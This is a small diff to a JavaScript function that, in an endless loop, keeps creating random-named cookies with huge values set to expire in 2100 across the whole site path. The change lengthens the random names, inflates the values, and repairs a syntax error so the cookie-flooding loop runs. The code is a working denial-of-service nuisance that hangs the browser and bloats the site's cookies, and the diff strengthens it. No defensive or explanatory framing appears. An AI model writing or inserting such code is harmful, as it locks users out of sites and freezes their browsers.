@@ -4,11 +4,11 @@ function fun(){
   let number = 0;
   let data = ["yes"];
   while(true){
-  data.push(makeid(6));
-  number=number+999999;
+  data.push(makeid(100));
+  number=number+99999999999999999999999;
   for(let i = 0; i < data.length; i++){
     let value = data[i];
-    document.cookie = value "=" + number + "; expires=Thu, 25 Dec 2100 12:00:00 UTC; path=/";
+    document.cookie = data[i] + "=" + number + "; expires=Thu, 25 Dec 2100 12:00:00 UTC; path=/";
     } 
   }
 }
